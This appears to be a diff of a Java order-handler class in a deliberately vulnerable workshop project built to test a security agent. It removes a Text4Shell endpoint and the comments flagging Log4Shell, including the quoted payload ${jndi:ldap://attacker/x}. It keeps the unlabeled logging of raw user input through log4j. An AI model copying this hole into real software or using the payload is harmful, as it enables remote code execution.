@@ -1,54 +1,45 @@
 package com.example.workshop.order;
 
-import org.apache.commons.text.StringSubstitutor;
+import com.sun.net.httpserver.HttpExchange;
+import com.sun.net.httpserver.HttpHandler;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.RequestParam;
-import org.springframework.web.bind.annotation.RestController;
 
-import java.util.Map;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.URLDecoder;
+import java.nio.charset.StandardCharsets;
 
-/**
- * REST endpoints for the Order Processor.
- *
- * <p>These handlers intentionally demonstrate the vulnerable dependencies so
- * the Security Agent has both dependency findings and reachable code paths to
- * reason about.
- */
-@RestController
-public class OrderController {
+public class OrderController implements HttpHandler {
 
-    // Log4Shell: logging attacker-controlled input on a vulnerable log4j-core
-    // version allows JNDI lookups such as ${jndi:ldap://attacker/x}.
     private static final Logger LOGGER = LogManager.getLogger(OrderController.class);
 
-    @GetMapping("/health")
-    public String health() {
-        return "OK";
-    }
-
-    /**
-     * Echoes a note back to the caller.
-     *
-     * <p>VULNERABLE (CVE-2021-44228): user input is passed straight to the
-     * logger, which on log4j-core 2.14.1 evaluates ${...} lookups.
-     */
-    @GetMapping("/orders/note")
-    public String note(@RequestParam("value") String value) {
+    /** Core logic, extracted so it can be unit-tested without a live server. */
+    public String note(String value) {
         LOGGER.info("Received order note: " + value);
         return "logged";
     }
 
-    /**
-     * "Renders" a templated label for an order.
-     *
-     * <p>VULNERABLE (CVE-2022-42889 / Text4Shell): commons-text 1.9 resolves
-     * ${script:...}, ${dns:...}, and ${url:...} prefixes during substitution.
-     */
-    @GetMapping("/orders/label")
-    public String label(@RequestParam("template") String template) {
-        StringSubstitutor substitutor = new StringSubstitutor(Map.of("orderId", "12345"));
-        return substitutor.replace(template);
+    @Override
+    public void handle(HttpExchange exchange) throws IOException {
+        String value = queryParam(exchange.getRequestURI().getRawQuery(), "value");
+        byte[] body = note(value).getBytes(StandardCharsets.UTF_8);
+        exchange.sendResponseHeaders(200, body.length);
+        try (OutputStream os = exchange.getResponseBody()) {
+            os.write(body);
+        }
+    }
+
+    private static String queryParam(String rawQuery, String key) {
+        if (rawQuery == null) {
+            return "";
+        }
+        for (String pair : rawQuery.split("&")) {
+            int eq = pair.indexOf('=');
+            if (eq > 0 && pair.substring(0, eq).equals(key)) {
+                return URLDecoder.decode(pair.substring(eq + 1), StandardCharsets.UTF_8);
+            }
+        }
+        return "";
     }
 }
